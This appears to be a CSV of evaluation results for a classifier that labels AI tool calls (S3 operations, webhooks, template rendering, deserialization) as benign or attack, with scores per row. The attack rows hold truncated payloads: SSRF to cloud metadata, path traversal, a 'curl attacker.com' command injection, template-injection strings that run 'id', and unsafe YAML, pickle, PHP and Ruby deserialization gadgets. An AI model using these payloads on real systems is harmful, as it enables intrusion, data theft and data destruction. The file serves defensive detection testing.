+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/2/""}",benign,attack,0.4480213522911072,0.5519786477088928,0.44802141189575195,True
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user24/file.txt""}",benign,attack,0.4660136103630066,0.5339863896369934,0.4660135805606842,True
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/14/""}",benign,attack,0.4128248691558838,0.5871751308441162,0.41282492876052856,True
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/8/""}",benign,attack,0.4326893091201782,0.5673106908798218,0.43268924951553345,True
+s3_operation,"{""operation"": ""list"", ""bucket"": ""logs"", ""prefix"": ""2024/01/""}",benign,benign,0.6103246212005615,0.6103246212005615,0.3896753489971161,True
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user12/file.txt""}",benign,attack,0.4764934778213501,0.5235065221786499,0.4764934778213501,True
+s3_operation,"{""operation"": ""put"", ""bucket"": ""backups"", ""key"": ""2024/backup.sql""}",benign,attack,0.44820839166641235,0.5517916083335876,0.44820839166641235,True
+s3_operation,"{""operation"": ""delete"", ""bucket"": ""temp"", ""key"": ""cache/old.json""}",benign,attack,0.4870085120201111,0.4870085120201111,0.5129914879798889,True
+s3_operation,"{""operation"": ""get"", ""bucket"": ""documents"", ""key"": ""reports/annual.pdf""}",benign,benign,0.6617537140846252,0.6617537140846252,0.33824625611305237,True
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user123/photo.jpg""}",benign,benign,0.6012760400772095,0.6012760400772095,0.39872390031814575,True
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""key"": ""cache/old.json"", ""prefix"": ""im",benign,attack,0.4553905725479126,0.5446094274520874,0.455390602350235,True
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""prefix"": ""images/"", ""key"": ""user16/fi",benign,attack,0.46166253089904785,0.5383374691009521,0.46166253089904785,True
+s3_operation,"{""operation"": ""get"", ""bucket"": ""my-app-data"", ""key"": ""uploads/file.pdf""}",benign,attack,0.44122588634490967,0.5587741136550903,0.44122588634490967,True
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user0/file.txt""}",benign,attack,0.4725976586341858,0.5274023413658142,0.4725976586341858,True
+s3_operation,"{""operation"": ""head"", ""bucket"": ""assets"", ""key"": ""logo.png""}",benign,attack,0.40509623289108276,0.5949037671089172,0.4050962030887604,True
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""key"": ""uploads/file.pdf"", ""prefix"": """,benign,benign,0.6163862943649292,0.6163862943649292,0.3836137652397156,True
+s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-8"", ""key"": ""files/doc28.pdf""}",benign,attack,0.41717880964279175,0.5828211903572083,0.41717877984046936,True
+s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-0"", ""key"": ""files/doc20.pdf""}",benign,attack,0.4359623193740845,0.5640376806259155,0.4359623193740845,True
+s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""prefix"": ""images/"", ""key"": ""reports/rep",benign,attack,0.416363000869751,0.583636999130249,0.4163629710674286,True
+s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-6"", ""key"": ""files/doc6.pdf""}",benign,attack,0.4166833758354187,0.5833166241645813,0.4166833758354187,True
+s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""key"": ""reports/report22.csv""}",benign,benign,0.6114046573638916,0.6114046573638916,0.3885953724384308,True
+s3_operation,"{""operation"": ""get"", ""bucket"": ""hr-data"", ""key"": ""employee-ssn.csv""}",attack,attack,0.4722558259963989,0.5277441740036011,0.47225579619407654,True
+s3_operation,"{""operation"": ""get"", ""bucket"": ""company-secrets"", ""key"": ""credentials.json""}",attack,attack,0.48429757356643677,0.5157024264335632,0.48429757356643677,True
+s3_operation,"{""operation"": ""list"", ""bucket"": ""audit-logs"", ""prefix"": """"}",attack,attack,0.4912259578704834,0.4912259578704834,0.5087740421295166,True
+s3_operation,"{""operation"": ""list"", ""bucket"": ""`curl attacker.com`"", ""prefix"": """"}",attack,attack,0.6740850806236267,0.3259148895740509,0.6740850806236267,True
+s3_operation,"{""operation"": ""get"", ""bucket"": ""http://169.254.169.254/latest/meta-data"", ""key"":",attack,attack,0.4135146737098694,0.5864853262901306,0.4135146737098694,True
+s3_operation,"{""operation"": ""put"", ""bucket"": ""public-bucket"", ""key"": ""shell.php"", ""content"": """,attack,attack,0.6691200733184814,0.33087989687919617,0.6691200733184814,True
+s3_operation,"{""operation"": ""copy"", ""source"": ""s3://victim-bucket/secrets"", ""dest"": ""s3://atta",attack,attack,0.4756889343261719,0.47568896412849426,0.5243110656738281,True
+s3_operation,"{""operation"": ""get"", ""bucket"": ""../../../../etc"", ""key"": ""passwd""}",attack,attack,0.6884791851043701,0.3115207850933075,0.6884791851043701,True
+send_webhook,"{""url"": ""https://api.pagerduty.com/webhooks"", ""payload"": {""event"": ""trigger""}}",benign,attack,0.4803156852722168,0.5196843147277832,0.4803156852722168,True
+send_webhook,"{""url"": ""https://hooks.example.com/webhook/2"", ""payload"": {""event"": ""event_2""}}",benign,attack,0.49890339374542236,0.49890339374542236,0.5010966062545776,True
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 10""}}",benign,attack,0.489815890789032,0.510184109210968,0.489815890789032,True
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 0""}}",benign,attack,0.49513357877731323,0.49513357877731323,0.5048664212226868,True
+send_webhook,"{""url"": ""https://webhook.site/32"", ""payload"": {""data"": 32}}",benign,attack,0.4317694306373596,0.5682305693626404,0.4317694902420044,True
+send_webhook,"{""url"": ""https://hooks.example.com/webhook/6"", ""payload"": {""event"": ""event_6""}}",benign,attack,0.48387467861175537,0.5161253213882446,0.483874648809433,True
+send_webhook,"{""url"": ""https://webhook.site/14"", ""payload"": {""data"": 14}}",benign,attack,0.4104798436164856,0.5895201563835144,0.4104797840118408,True
+send_webhook,"{""url"": ""https://discord.com/api/webhooks/xxx/yyy"", ""payload"": {""content"": ""Mess",benign,attack,0.4883820414543152,0.5116179585456848,0.4883820712566376,True
+send_webhook,"{""url"": ""https://webhook.site/8"", ""payload"": {""data"": 8}}",benign,attack,0.43039828538894653,0.5696017146110535,0.43039828538894653,True
+send_webhook,"{""url"": ""https://api.zapier.com/hooks/catch/xxx"", ""payload"": {""data"": ""test""}}",benign,attack,0.4921213388442993,0.5078786611557007,0.4921213686466217,True
+send_webhook,"{""url"": ""https://api.github.com/repos/owner/repo/dispatches"", ""payload"": {""event",benign,attack,0.4738340973854065,0.5261659026145935,0.4738340973854065,True
+send_webhook,"{""url"": ""https://webhook.site/22"", ""payload"": {""data"": 22}}",benign,attack,0.41977256536483765,0.5802274346351624,0.41977259516716003,True
+send_webhook,"{""url"": ""https://hooks.example.com/webhook/18"", ""payload"": {""event"": ""event_18""}",benign,attack,0.4770800471305847,0.5229199528694153,0.47707998752593994,True
+send_webhook,"{""url"": ""https://hooks.example.com/webhook/12"", ""payload"": {""event"": ""event_12""}",benign,attack,0.479820191860199,0.520179808139801,0.47982022166252136,True
+send_webhook,"{""url"": ""https://webhook.site/16"", ""payload"": {""data"": 16}}",benign,attack,0.42817890644073486,0.5718210935592651,0.42817890644073486,True
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 20""}}",benign,attack,0.4859660863876343,0.5140339136123657,0.48596611618995667,True
+send_webhook,"{""url"": ""https://webhook.site/30"", ""payload"": {""data"": 30}}",benign,attack,0.4027221202850342,0.5972778797149658,0.40272215008735657,True
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 26""}}",benign,attack,0.4816650152206421,0.5183349847793579,0.4816649854183197,True
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 4""}}",benign,attack,0.4926221966743469,0.5073778033256531,0.4926222264766693,True
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 34""}}",benign,attack,0.48416656255722046,0.5158334374427795,0.48416659235954285,True
+send_webhook,"{""url"": ""https://webhook.site/unique-id"", ""payload"": {""test"": true}}",benign,attack,0.4771661162376404,0.5228338837623596,0.47716614603996277,True
+send_webhook,"{""url"": ""https://webhook.site/24"", ""payload"": {""data"": 24}}",benign,attack,0.4166901707649231,0.5833098292350769,0.4166901111602783,True
+send_webhook,"{""url"": ""https://hooks.slack.com/services/xxx/yyy/zzz"", ""payload"": {""text"": ""Ale",benign,attack,0.495678186416626,0.4956781566143036,0.504321813583374,True
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 28""}}",benign,attack,0.48194122314453125,0.5180587768554688,0.48194122314453125,True
+send_webhook,"{""url"": ""https://internal.corp.net/webhook"", ""payload"": {""token"": ""xxx""}}",attack,attack,0.496432363986969,0.496432363986969,0.503567636013031,True
+send_webhook,"{""url"": ""http://localhost:6379/"", ""payload"": ""*1\r\n$8\r\nFLUSHALL\r\n""}",attack,attack,0.40455150604248047,0.40455153584480286,0.5954484939575195,True
+send_webhook,"{""url"": ""gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>"", ""payload"": {}}",attack,attack,0.6108108758926392,0.3891891539096832,0.6108108758926392,True
+send_webhook,"{""url"": ""http://127.0.0.1:9200/_search"", ""payload"": {""query"": {""match_all"": {}}}",attack,attack,0.486006498336792,0.48600655794143677,0.513993501663208,True
+send_webhook,"{""url"": ""http://169.254.169.254/latest/meta-data/iam/security-credentials/"", ""pa",attack,attack,0.46852177381515503,0.531478226184845,0.46852174401283264,True
+send_webhook,"{""url"": ""http://2852039166/latest/meta-data/"", ""payload"": {}}",attack,benign,0.6270484924316406,0.6270484924316406,0.3729515075683594,True
+send_webhook,"{""url"": ""file:///etc/passwd"", ""payload"": {}}",attack,attack,0.6559831500053406,0.3440168797969818,0.6559831500053406,True
+send_webhook,"{""url"": ""https://admin-api.company.com/notify"", ""payload"": {""secret"": ""yyy""}}",attack,attack,0.47262924909591675,0.47262924909591675,0.5273707509040833,True
+render_template,"{""template"": ""Hello, {{name}}!"", ""data"": {""name"": ""John""}}",benign,attack,0.48121631145477295,0.48121628165245056,0.518783688545227,True
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 16"", ""data"": {""name"": ""User16""}}",benign,attack,0.49860846996307373,0.49860844016075134,0.5013915300369263,True
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 14""}}",benign,attack,0.47794491052627563,0.5220550894737244,0.47794485092163086,True
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 22""}}",benign,attack,0.48558610677719116,0.5144138932228088,0.48558610677719116,True
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 30""}}",benign,attack,0.4826149344444275,0.5173850655555725,0.4826149046421051,True
+render_template,"{""template"": ""User: {{user.name}} ({{user.email}})"", ""data"": {""user"": {""name"": """,benign,attack,0.49325937032699585,0.5067406296730042,0.49325934052467346,True
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 18}}",benign,attack,0.4737430810928345,0.5262569189071655,0.4737430512905121,True
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 34"", ""data"": {""name"": ""User34""}}",benign,attack,0.4947294592857361,0.5052705407142639,0.4947294592857361,True
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 10}}",benign,attack,0.4755932688713074,0.5244067311286926,0.4755932688713074,True
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 6"", ""data"": {""name"": ""User6""}}",benign,attack,0.4917222857475281,0.5082777142524719,0.4917222857475281,True
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 20"", ""data"": {""name"": ""User20""}}",benign,attack,0.49155980348587036,0.5084401965141296,0.49155983328819275,True
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 4"", ""data"": {""name"": ""User4""}}",benign,attack,0.49254751205444336,0.49254754185676575,0.5074524879455566,True
+render_template,"{""template"": ""Order #{{order_id}} - Total: ${{total}}"", ""data"": {""order_id"": 123",benign,attack,0.4927782416343689,0.5072217583656311,0.4927782714366913,True
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 12""}}",benign,attack,0.4827132225036621,0.5172867774963379,0.4827132523059845,True
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 24"", ""data"": {""name"": ""User24""}}",benign,attack,0.4894412159919739,0.5105587840080261,0.48944124579429626,True
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 32""}}",benign,attack,0.493252694606781,0.506747305393219,0.4932526648044586,True
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 2}}",benign,attack,0.4878461956977844,0.5121538043022156,0.4878461956977844,True
+render_template,"{""template"": ""Items: {% for item in items %}{{item}}, {% endfor %}"", ""data"": {""i",benign,attack,0.4430466890335083,0.4430466890335083,0.5569533109664917,True
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 8}}",benign,attack,0.47671449184417725,0.5232855081558228,0.47671449184417725,True
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 0}}",benign,attack,0.4904763102531433,0.5095236897468567,0.4904763102531433,True
+render_template,"{""template"": ""<h1>{{title}}</h1><p>{{content}}</p>"", ""data"": {""title"": ""Welcome""",benign,attack,0.49861305952072144,0.49861305952072144,0.5013869404792786,True
+render_template,"{""template"": ""Date: {% now 'Y-m-d' %}"", ""data"": {}}",benign,attack,0.4064396023750305,0.4064396023750305,0.5935603976249695,True
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 26""}}",benign,attack,0.4833880662918091,0.5166119337081909,0.48338809609413147,True
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 28}}",benign,attack,0.4678741693496704,0.5321258306503296,0.467874139547348,True
+render_template,"{""template"": ""{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",attack,attack,0.6761157512664795,0.3238842487335205,0.6761157512664795,True
+render_template,"{""template"": ""API Key: {{api_key}}"", ""data"": {""api_key"": ""sk-xxx""}}",attack,attack,0.4854367971420288,0.4854368269443512,0.5145632028579712,True
+render_template,"{""template"": ""Password: {{password}}"", ""data"": {""password"": ""secret""}}",attack,attack,0.4563167691230774,0.4563167691230774,0.5436832308769226,True
+render_template,"{""template"": ""{{self._TemplateReference__context.cycler.__init__.__globals__.os.",attack,attack,0.6694865226745605,0.33051344752311707,0.6694865226745605,True
+render_template,"{""template"": ""{{constructor.constructor('return this.process')().mainModule.requ",attack,attack,0.6895344257354736,0.310465544462204,0.6895344257354736,True
+render_template,"{""template"": ""${{<%[%'\""}}%\\."", ""data"": {}}",attack,attack,0.6919688582420349,0.3080311119556427,0.6919688582420349,True
+render_template,"{""template"": ""<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')",attack,attack,0.6923964023590088,0.3076035976409912,0.6923964023590088,True
+render_template,"{""template"": ""${T(java.lang.Runtime).getRuntime().exec('id')}"", ""data"": {}}",attack,attack,0.6665242910385132,0.3334757685661316,0.6665242910385132,True
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 24, \""name\"": \""item24\""}""}",benign,attack,0.45444852113723755,0.45444849133491516,0.5455514788627625,True
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 18, \""name\"": \""item18\""}""}",benign,attack,0.44948703050613403,0.44948703050613403,0.550512969493866,True
+deserialize_data,"{""format"": ""msgpack"", ""data"": ""base64_encoded_msgpack""}",benign,benign,0.6099201440811157,0.6099201440811157,0.3900798559188843,True
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 10, \""name\"": \""item10\""}""}",benign,attack,0.455990731716156,0.455990731716156,0.544009268283844,True
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 16}]}""}",benign,attack,0.6097949147224426,0.3902050852775574,0.6097949147224426,True
+deserialize_data,"{""format"": ""xml"", ""data"": ""<data><item>test</item></data>""}",benign,attack,0.49846112728118896,0.4984610974788666,0.501538872718811,True
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""name\"": \""test\""}""}",benign,attack,0.41298818588256836,0.41298821568489075,0.5870118141174316,True
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 22, \""name\"": \""item22\""}""}",benign,attack,0.44567370414733887,0.44567370414733887,0.5543262958526611,True
+deserialize_data,"{""format"": ""toml"", ""data"": ""[database]\nhost = \""localhost\""""}",benign,attack,0.43418049812316895,0.43418046832084656,0.565819501876831,True
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 6}]}""}",benign,attack,0.6107980012893677,0.3892019987106323,0.6107980012893677,True
+deserialize_data,"{""format"": ""yaml"", ""data"": ""name: test\nvalue: 123""}",benign,attack,0.4634014368057251,0.5365985631942749,0.4634014666080475,True
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 26}]}""}",benign,attack,0.6081324219703674,0.3918675184249878,0.6081324219703674,True
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 2\\nname: item2""}",benign,attack,0.4769037365913391,0.5230962634086609,0.4769037067890167,True
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 28}]}""}",benign,attack,0.6062144637107849,0.3937855362892151,0.6062144637107849,True
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 30\\nname: item30""}",benign,attack,0.4401620626449585,0.5598379373550415,0.4401620924472809,True
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 1}]}""}",benign,attack,0.6195629835128784,0.3804369568824768,0.6195629835128784,True
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 12\\nname: item12""}",benign,attack,0.4527818560600281,0.5472181439399719,0.4527818560600281,True
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 20, \""name\"": \""item20\""}""}",benign,attack,0.45225828886032104,0.45225828886032104,0.547741711139679,True
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 14, \""name\"": \""item14\""}""}",benign,attack,0.4641200304031372,0.464120090007782,0.5358799695968628,True
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 32\\nname: item32""}",benign,attack,0.4891548156738281,0.5108451843261719,0.4891548156738281,True
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 4\\nname: item4""}",benign,attack,0.47434812784194946,0.5256518721580505,0.47434815764427185,True
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 8\\nname: item8""}",benign,attack,0.4727625250816345,0.5272374749183655,0.4727625250816345,True
+deserialize_data,"{""format"": ""yaml"", ""data"": ""settings:\n  debug: false\n  port: 3000""}",benign,attack,0.4714707136154175,0.4714707136154175,0.5285292863845825,True
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 0}]}""}",benign,attack,0.6229913234710693,0.3770086467266083,0.6229913234710693,True
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""credentials\"": {\""key\"": \""secret\""}}""}",attack,attack,0.655028760433197,0.344971239566803,0.655028760433197,True
+deserialize_data,"{""format"": ""php"", ""data"": ""O:8:\""stdClass\"":1:{s:4:\""evil\"";s:20:\""system('id');",attack,attack,0.6142879128456116,0.38571202754974365,0.6142879128456116,True
+deserialize_data,"{""format"": ""yaml"", ""data"": ""!!python/object/new:subprocess.check_output [['cat',",attack,attack,0.6765963435173035,0.3234036862850189,0.6765963435173035,True
+deserialize_data,"{""format"": ""yaml"", ""data"": ""api_key: sk-xxx""}",attack,attack,0.45899641513824463,0.5410035848617554,0.458996444940567,True
+deserialize_data,"{""format"": ""java"", ""data"": ""rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==""}",attack,attack,0.6111897230148315,0.38881024718284607,0.6111897230148315,True
+deserialize_data,"{""format"": ""yaml"", ""data"": ""!!python/object/apply:os.system ['id']""}",attack,attack,0.6572197079658508,0.3427802324295044,0.6572197079658508,True
+deserialize_data,"{""format"": ""pickle"", ""data"": ""gASVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlF",attack,attack,0.44338369369506836,0.44338369369506836,0.5566163063049316,True
+deserialize_data,"{""format"": ""ruby"", ""data"": ""!ruby/object:Gem::Requirement requirements: !ruby/ob",attack,attack,0.6768550872802734,0.32314494252204895,0.6768550872802734,True
